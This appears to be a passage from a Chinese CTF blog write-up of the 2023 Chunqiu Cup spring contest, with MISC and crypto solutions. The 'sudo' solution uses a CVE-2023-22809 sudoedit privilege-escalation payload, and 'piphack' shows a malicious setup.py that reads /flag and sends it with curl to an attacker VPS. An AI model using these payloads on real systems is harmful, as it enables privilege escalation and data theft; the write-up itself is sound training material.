      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;竞赛时间&lt;/p&gt;
&lt;p&gt;2023-09-02 09:00:00~2023-09-03 09:00:00&lt;/p&gt;
&lt;p&gt;竞赛简介&lt;/p&gt;
&lt;p&gt;目前我国网民规模已突破9亿，成为名副其实的网络大国，但我国与网络强国相比还有一定距离。习近平总书记指出：要</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2023赛" scheme="https://lazzzaro.github.io/tags/2023%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2023年春秋杯网络安全联赛 春季赛</title>
    <link href="https://lazzzaro.github.io/2023/05/19/match-2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B-%E6%98%A5%E5%AD%A3%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2023/05/19/match-2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B-%E6%98%A5%E5%AD%A3%E8%B5%9B/</id>
    <published>2023-05-19T10:13:55.000Z</published>
    <updated>2023-06-04T16:24:22.895Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>2023年春秋杯网络安全联赛春季赛，将更加深化人才培养的意义，给予新生代选手更大的舞台，本次比赛特将时长延长至7天，相对于以往的比赛，这是一次前所未有的尝试。同时，赛题难度分布更加合理均衡，题目质量依旧值得让人期待。题目设计涵盖了多个方面的安全技术，赛题考题范围包括Web 漏洞与渗透(Web)，软件逆向 (Reverse Engineering)，二进制漏洞挖掘和利用(PWN)，密码学（crypto），与杂项（Misc）五大类型，且每个方向每天各放一道题目（第七天不放题）。同时我们还加入了彩蛋题目，希望各位参赛选手玩的开心，在比赛中可以有所收获，希望通过春秋杯能够让各位感受到比赛的乐趣以及春秋GAME的用心，欢迎各位师傅前来挑战。为使比赛更纯粹，更公平，更高质量，我们取消了奖金奖励，并配备了五大方向的高质量赛题。没有名利，更加公平，充分考察选手的综合能力。</p><p><strong>Rank: 13</strong></p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h3><blockquote><p>小楠楠是一个热爱技术的小姑娘，最近开始学习Linux系统中的sudo命令，希望能够更好地管理系统。然而，她并不知道在使用sudo时存在着潜在的网络安全隐患，这可能会给系统带来不必要的风险。因此，她决定进一步学习有关网络安全的知识，以更好地保护系统和数据的安全。小楠楠相信，只有不断学习和提高自己的技能，才能成为一名真正的技术专家。</p></blockquote><p>ssh连接上，发现根目录下有flag，但需要root权限，根据题目描述应该为sudo提权，参考 <a href="https://blog.csdn.net/weixin_46944519/article/details/129971508">【权限提升】Linux Sudo权限提升漏洞(CVE-2023-22809)</a>。</p><p><code>sudo -l</code> 查看NOPASSWD特殊权限（对应 <code>/etc/sudoer.d</code> 文件）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for xiaonannan on engine-1:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User xiaonannan may run the following commands on engine-1:</span><br><span class="line">    (ALL : ALL) NOPASSWD: sudoedit /etc/GAMELAB</span><br></pre></td></tr></table></figure><p>故 <code>/etc/GAMELAB</code> 有特殊权限，而环境无vim有nano，尝试payload：</p><p><code>EDITOR=&quot;nano -- /flag&quot; sudoedit /etc/GAMELAB</code></p><p>即可在nano编辑模式下得到flag。</p><p>​    </p><h3 id="piphack"><a href="#piphack" class="headerlink" title="piphack"></a>piphack</h3><blockquote><p>可以安装任意包的接口，你会怎么利用呢？</p></blockquote><p>给了一个可以安装任意包的接口，寻找到pip相关的提权方法：<a href="https://www.cnblogs.com/zlgxzswjy/p/10245977.html，参照着FakePip的方法制作">https://www.cnblogs.com/zlgxzswjy/p/10245977.html，参照着FakePip的方法制作</a> <code>setup.py</code> 并打包成whl文件放到vps上，但怎么试也没成功反弹shell。</p><p>尝试出用另一种git方法同样可以从库中拉取恶意脚本读取flag。</p><p>在vps上用python搭建服务器：<code>python3 -m http.server 10010</code></p><p>制作恶意脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">os.system(<span class="string">&#x27;curl http://vps-ip:10010?&#x27;</span>+f)</span><br></pre></td></tr></table></figure><p>放到gitee新建的仓库里，再安装任意包的输入出输入：<code>git+https://gitee.com/lazzzaro/test.git</code></p><p>即可运行库里的 <code>setup.py</code>，在vps内可以看到外带的flag：</p><p><img src="/2023/05/19/match-2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B-%E6%98%A5%E5%AD%A3%E8%B5%9B/image-20230519191149050.png" alt="image-20230519191149050"></p><p>​    </p><h3 id="wordle"><a href="#wordle" class="headerlink" title="wordle"></a>wordle</h3><blockquote><p>做题累了，不如跟小楠楠一起来玩一个wordle游戏，边玩边学英文，一举两得。</p><p>（纯游戏，通关即拿flag）</p></blockquote><p>wordle猜词游戏，6次内猜对一个5字母单词即可拿到flag。送分。</p><p>​    </p><h3 id="happy2forensics"><a href="#happy2forensics" class="headerlink" title="happy2forensics"></a>happy2forensics</h3><blockquote><p>小楠楠明明看到了flag，怎么打开文件却找不到呢?</p></blockquote><p>查看流量包里http对象，导出 <code>secret.rar</code>，解压出 <code>secret.vhdx</code>，是一个bitlocker加密的磁盘。</p><p>根据官方提示捕获源端口为20，目的端口为80的TCP流量，可以获得bitlocker密码：</p><p><code>bitlocker 120483-350966-299189-055297-225478-133463-431684-359403</code></p><p>在回收站找到 <code>flag2.zip</code> 但需要密码。</p><p>将所有小图片拼接得到 <code>password: 856a-a56b6a705653</code>，解压 <code>flag2.zip</code> 得到 <code>flag2:-919c-a140d7054ac5</code>。</p><p>一堆小图片中有一个不一样大小的图片 <code>210-1.png</code>，binwalk分解，分解出的jpg的APP1块里藏有另一个 <code>FFD8</code> 头，提取出新的jpg，得到 <code>flag1:f97d5b05-d312-46ac</code>。</p><p>合并，flag：<code>flag&#123;f97d5b05-d312-46ac-919c-a140d7054ac5&#125;</code>。</p><p>​    </p><h3 id="盲人隐藏了起来"><a href="#盲人隐藏了起来" class="headerlink" title="盲人隐藏了起来"></a>盲人隐藏了起来</h3><p>12和34做对比，发现12相比34少了38个字节，对照补充字节打开12.mp4，得到压缩包密码：<code>ChunJiSai7k7kbibi@!</code>。</p><p>解压 <code>flag.zip</code> 得到 <code>flag.png</code>，在尾部发现 <code>keyischunqiu123</code>，zsteg查看png图片的lsb，发现在 <code>b1,bgr,lsb,xy</code> 可以直接看到flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">b1,bgr,lsb,xy       .. &lt;wbStego size=84, ext=&quot;\x00fl&quot;, data=&quot;ag&#123;2c8ba89&quot;..., even=false&gt;</span><br><span class="line">    00000000: 54 00 00 00 66 6c 61 67  7b 32 63 38 62 61 38 39  |T...flag&#123;2c8ba89|</span><br><span class="line">    00000010: 37 2d 30 32 30 35 2d 39  62 66 66 2d 31 32 33 64  |7-0205-9bff-123d|</span><br><span class="line">    00000020: 2d 32 38 31 64 31 32 61  32 34 63 33 38 7d ff ff  |-281d12a24c38&#125;..|</span><br><span class="line">    00000030: ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|</span><br></pre></td></tr></table></figure><p>flag：<code>flag&#123;2c8ba897-0205-9bff-123d-281d12a24c38&#125;</code>。</p><p>​    </p><h3 id="58与64"><a href="#58与64" class="headerlink" title="58与64"></a>58与64</h3><blockquote><p>好多文件..得想办法把他们弄在一起</p></blockquote><p>14268个txt文件，每个txt文件内保存的为base58结果，解码后再连接成字符串，多次base64解码即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> base58</span><br><span class="line"></span><br><span class="line">s = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14268</span>):</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">f&#x27;tmp/<span class="subst">&#123;i&#125;</span>.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).readline().strip()</span><br><span class="line">    s += base58.b58decode(f)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    s = base64.b64decode(s)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;640ce012-3d3a-446d-9d0e-5d2fe840063b&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><blockquote><p>来签到吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, x, y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">keygen</span>(<span class="params">nbit</span>):</span><br><span class="line">    p, q = [getPrime(nbit) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">return</span> (p, q)</span><br><span class="line"></span><br><span class="line">p, q = keygen(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">t = <span class="built_in">len</span>(flag)//<span class="number">2</span></span><br><span class="line">part1 = bytes_to_long(flag[:t])</span><br><span class="line">part2 = bytes_to_long(flag[t:])</span><br><span class="line"></span><br><span class="line">D = <span class="number">1117</span></span><br><span class="line">x = </span><br><span class="line">y = </span><br><span class="line"><span class="keyword">assert</span> x**<span class="number">2</span> - D * y**<span class="number">2</span> == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">enc1 = <span class="built_in">pow</span>(<span class="number">233</span> * n ** <span class="number">2</span> + <span class="number">1</span>, part1, n ** <span class="number">3</span>)</span><br><span class="line">enc2 = <span class="built_in">pow</span>(y * n + <span class="number">1</span>, part2, n ** <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;enc1 = <span class="subst">&#123;enc1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;enc2 = <span class="subst">&#123;enc2&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 14381700422128582509148801752355744589949207890477326887251636389639477554903212313766087310581920423926674144511237847467160303159477932732842314969782540035709454603184976310835433114879043016737665256729350745769071186849072915716081380191025215059636548339167264601163525017898164466972776553148697204889820118261937316228241099344357088387154112255824092894798716597134811437852876763391697588672779069166285303075312833415574850549277205130215394422655325352478386576833373623679069271857652029364332047485797407322257853316210866532938722911480593571175419708834718860211036796987231227104370259051299799633809</span></span><br><span class="line"><span class="string">enc1 = 7213976567554002619445032200800186986758840297933991288547009708561953107405266725278346810536664670987171549114913443730366439254199110599202411546254632702440251000149674899033994570393935743323319736976929843596350656674709510612789987746895513057821629144725499933366382123251520676386059405796801097683107223771674383940907066300331503757142088898427893069444164604408189686282018392714450005250018004986102062209998463347007934222341910941474212611569508001910685822097788669516018081617394144015000387497289693096617795809933540456797387940627782045397249431573540932386564021712811633992948508497879189416719996092292320828635490820907122756459412206735413770335545012892724496210585503157766011075566023635046144730429791359690237088629187946232458937292767085665897489251315749496284368726255508362410603108788759785472319449267909859926786774679533591222665476101832482161295321411313525830843915966136814748249906589458905410141906965538387896747375546846618213595165688661941876715858338407833641907024891922856719044736945863722003318526031957256722493189062624177017279248142024760515092698242159769372410662895078523142768353100643884341413944795392762315999109544070401451087596138520908569234305384182336436670714204963907240715652950621301644972412252424876159530992</span></span><br><span class="line"><span class="string">enc2 = 15954854445966181136742750543358176358186230663706091821454832527034640100670779737656720251005109942306013877086451482243141488450122353285697850016200364912263403464109626937525725210545566742746628476797261121321515812788726862118315480354196115424526212965145342675007815411995594752584377871686965531829990461770047418586001518916553661158567047779694730702789677326905844275827365395845945286695577426050334364557405151339008293258932006267159313380746863008928500607405457044370494583863960981060999695448408234857505591647503423149271589648863473472196402149897680041851877198062464480400493467334040101779732999029043327947071232256187123316057998759518569161852646625701393295408789279678540894319137126821001853808931387200759810381958895695749251834840804088478214013923869059004663359509316215974475427057000629842098545503905230785431115754636129549758888267877395566717448365986552725726428222769339088308242580851434964429627168365161743834285778996916154182286570122208454025753108647581888781783757375011437394936853319184725324597963035778640646869326035848170752766298225095197226934969602554875402243303906613183431896300664684256018886119255870435413622515792072064528098344111446380223430819596310173312668368618931885819458529703118195242890075359424013033800260927722161030183373647798407301688760998313223874318513944409702828538509864933624724225689414495687466779277994989628367119101</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>PELL方程求解+二项式定理应用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">14381700422128582509148801752355744589949207890477326887251636389639477554903212313766087310581920423926674144511237847467160303159477932732842314969782540035709454603184976310835433114879043016737665256729350745769071186849072915716081380191025215059636548339167264601163525017898164466972776553148697204889820118261937316228241099344357088387154112255824092894798716597134811437852876763391697588672779069166285303075312833415574850549277205130215394422655325352478386576833373623679069271857652029364332047485797407322257853316210866532938722911480593571175419708834718860211036796987231227104370259051299799633809</span></span><br><span class="line">enc1 = <span class="number">7213976567554002619445032200800186986758840297933991288547009708561953107405266725278346810536664670987171549114913443730366439254199110599202411546254632702440251000149674899033994570393935743323319736976929843596350656674709510612789987746895513057821629144725499933366382123251520676386059405796801097683107223771674383940907066300331503757142088898427893069444164604408189686282018392714450005250018004986102062209998463347007934222341910941474212611569508001910685822097788669516018081617394144015000387497289693096617795809933540456797387940627782045397249431573540932386564021712811633992948508497879189416719996092292320828635490820907122756459412206735413770335545012892724496210585503157766011075566023635046144730429791359690237088629187946232458937292767085665897489251315749496284368726255508362410603108788759785472319449267909859926786774679533591222665476101832482161295321411313525830843915966136814748249906589458905410141906965538387896747375546846618213595165688661941876715858338407833641907024891922856719044736945863722003318526031957256722493189062624177017279248142024760515092698242159769372410662895078523142768353100643884341413944795392762315999109544070401451087596138520908569234305384182336436670714204963907240715652950621301644972412252424876159530992</span></span><br><span class="line">enc2 = <span class="number">15954854445966181136742750543358176358186230663706091821454832527034640100670779737656720251005109942306013877086451482243141488450122353285697850016200364912263403464109626937525725210545566742746628476797261121321515812788726862118315480354196115424526212965145342675007815411995594752584377871686965531829990461770047418586001518916553661158567047779694730702789677326905844275827365395845945286695577426050334364557405151339008293258932006267159313380746863008928500607405457044370494583863960981060999695448408234857505591647503423149271589648863473472196402149897680041851877198062464480400493467334040101779732999029043327947071232256187123316057998759518569161852646625701393295408789279678540894319137126821001853808931387200759810381958895695749251834840804088478214013923869059004663359509316215974475427057000629842098545503905230785431115754636129549758888267877395566717448365986552725726428222769339088308242580851434964429627168365161743834285778996916154182286570122208454025753108647581888781783757375011437394936853319184725324597963035778640646869326035848170752766298225095197226934969602554875402243303906613183431896300664684256018886119255870435413622515792072064528098344111446380223430819596310173312668368618931885819458529703118195242890075359424013033800260927722161030183373647798407301688760998313223874318513944409702828538509864933624724225689414495687466779277994989628367119101</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pell</span>(<span class="params">N, numTry = <span class="number">100</span></span>):</span><br><span class="line">    cf = continued_fraction(sqrt(N))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(numTry):</span><br><span class="line">        denom = cf.denominator(i)</span><br><span class="line">        numer = cf.numerator(i)</span><br><span class="line">        <span class="keyword">if</span> numer^<span class="number">2</span> - N * denom^<span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> numer, denom</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">N = <span class="number">1117</span></span><br><span class="line">x, y = solve_pell(N)</span><br><span class="line"></span><br><span class="line">flag1 = (enc1 - <span class="number">1</span>) // n**<span class="number">2</span> * inverse_mod(<span class="number">233</span>, n) % n</span><br><span class="line">flag2 = (enc2 % n**<span class="number">2</span> - <span class="number">1</span>) // n * inverse_mod(y, n) % n</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(flag1)[<span class="number">2</span>:])+<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(flag2)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;11e89e28-4e27-47f0-a7c7-8e66c18881be&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="backdoor"><a href="#backdoor" class="headerlink" title="backdoor"></a>backdoor</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;xxx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_Parameters</span>():</span><br><span class="line">    w = getPrime(<span class="number">25</span>)</span><br><span class="line">    a = getPrime(<span class="number">15</span>)</span><br><span class="line">    b = getPrime(<span class="number">15</span>)</span><br><span class="line">    x = getPrime(<span class="number">30</span>)</span><br><span class="line">    <span class="keyword">return</span> w,a,b,x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Malicious_ECDH</span>():</span><br><span class="line">    w,a,b,x = Get_Parameters()</span><br><span class="line">    </span><br><span class="line">    P = getPrime(<span class="number">512</span>)</span><br><span class="line">    A = getRandomNBitInteger(<span class="number">30</span>)</span><br><span class="line">    B = getRandomNBitInteger(<span class="number">40</span>)</span><br><span class="line">    F = GF(P)</span><br><span class="line">    E = EllipticCurve(F, [A, B])</span><br><span class="line">    G = E.random_point()</span><br><span class="line">    k1 = getRandomNBitInteger(<span class="number">50</span>)</span><br><span class="line">    M1 = k1 * G</span><br><span class="line">    </span><br><span class="line">    Y = x * G</span><br><span class="line">    t = randint(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    t = <span class="number">1</span></span><br><span class="line">    z = (k1 - w * t) * G + (-a*k1 - b) * Y</span><br><span class="line">    k2 = sha256(<span class="built_in">str</span>(z[<span class="number">0</span>]).encode()).digest()[:<span class="number">6</span>]</span><br><span class="line">    k2 = bytes_to_long(k2)</span><br><span class="line">    M2 = k2 * G</span><br><span class="line">    k_rec = getRandomNBitInteger(<span class="number">50</span>)</span><br><span class="line">    B_ = k_rec * G</span><br><span class="line">    shared_key1 = k_rec * M2 </span><br><span class="line">    shared_key2 = k2 * B_</span><br><span class="line">    <span class="keyword">assert</span> shared_key1 == shared_key2</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>((w,a,b,x))</span><br><span class="line">    <span class="built_in">print</span>((A,B,P))</span><br><span class="line">    <span class="built_in">print</span>(G.xy())</span><br><span class="line">    <span class="built_in">print</span>(M1.xy())</span><br><span class="line">    <span class="built_in">print</span>(M2.xy())</span><br><span class="line">    <span class="built_in">print</span>(B_.xy())</span><br><span class="line">    <span class="keyword">return</span> shared_key1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">easy_enc</span>(<span class="params">pt,key</span>):</span><br><span class="line">    key = md5(<span class="built_in">str</span>(<span class="built_in">int</span>(key[<span class="number">0</span>])).encode()).digest()</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    ct = cipher.encrypt(pad(pt,<span class="number">16</span>))</span><br><span class="line">    <span class="built_in">print</span>(ct)</span><br><span class="line">    </span><br><span class="line">key = Malicious_ECDH()</span><br><span class="line">easy_enc(flag,key)</span><br></pre></td></tr></table></figure></blockquote><p>$z = (k_1 - wt) G + (-ak_1 - b)Y=k_1G-wtG+(-ak_1Y-bY)=M_1-wtG-axM_1-bxG$</p><p>又 $key2=k_2B$，求解得到共享key，解AES即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">w, a, b, x = (<span class="number">31889563</span>, <span class="number">31153</span>, <span class="number">28517</span>, <span class="number">763220531</span>)</span><br><span class="line">A, B, P = (<span class="number">1064988096</span>, <span class="number">802063264240</span>, <span class="number">12565302212045582769124388577074506881895777499095598016237085270545754804754108580101112266821575105979557524040668050927829331647411956215940656838233527</span>)</span><br><span class="line">G = (<span class="number">359297413048687497387015267480858122712978942384458634636826020013871463646849523577260820163767471924019580831592309960165276513810592046624940283279131</span>, <span class="number">9290586933629395882565073588501573863992359052743649536992808088692463307334265060644810911389976524008568647496608901222631270760608733724291675910247770</span>)</span><br><span class="line">M1 = (<span class="number">10930305358553250299911486296334290816447877698513318419802777123689138630792465404548228252534960885714060411282825155604339364568677765849414624286307139</span>, <span class="number">7974701243567912294657709972665114029771010872297725947444110914737157017082782484356147938296124777392629435915168481799494053881335678760116023075462921</span>)</span><br><span class="line">M2 = (<span class="number">497353451039150377961380023736260648366248764299414896780530627602565037872686230259859191906258041016214805015473019277626331812412272940029276101709693</span>, <span class="number">8439756863534455395772111050047162924667310322829095861192323688205133726655589045018003963413676473738236408975953021037765999542116607686218566948766462</span>)</span><br><span class="line">B = (<span class="number">5516900502352630982628557924432908395278078868116449817099410694627060720635892997830736032175084336697081211958825053352950153336574705799801251193930256</span>, <span class="number">10314456103976125214338213393161012551632498638755274752918126246399488480437083278584365543698685202192543021224052941574332651066234126608624976216302370</span>)</span><br><span class="line">enc = <span class="string">b&#x27;\x1a\xfb\xa2\xe1\x86\x04\xfak\x9a\xa3\xd15\xb8\x16\x1d\xbc\xa9S\xf5;\xfa\xf1\x08dn~\xd4\x94\xa4;^*\xf6\xd7\xf10\xa3\xe1k`\x1f-\xef\x80\x16\x80\x80\xe2&#x27;</span></span><br><span class="line"></span><br><span class="line">E = EllipticCurve(GF(P), [A, B])</span><br><span class="line">G, M1, M2, B = [E(_) <span class="keyword">for</span> _ <span class="keyword">in</span> [G, M1, M2, _B]]</span><br><span class="line">t = <span class="number">1</span></span><br><span class="line">z = M1 - w*t* G - a*x*M1 - b*x*G</span><br><span class="line">k2 = sha256(<span class="built_in">str</span>(z[<span class="number">0</span>]).encode()).digest()[:<span class="number">6</span>]</span><br><span class="line">k2 = bytes_to_long(k2)</span><br><span class="line">key = k2 * _B</span><br><span class="line"></span><br><span class="line">key = md5(<span class="built_in">str</span>(<span class="built_in">int</span>(key[<span class="number">0</span>])).encode()).digest()</span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">flag = cipher.decrypt(enc)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;63259ab8-4916-4095-8888-d92c2b003e18&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="magic-dlp"><a href="#magic-dlp" class="headerlink" title="magic_dlp"></a>magic_dlp</h3><blockquote><p>ez hyperelliptic curve problem</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = random_prime(<span class="number">2</span> ^ <span class="number">256</span>) </span><br><span class="line">sx = randint(<span 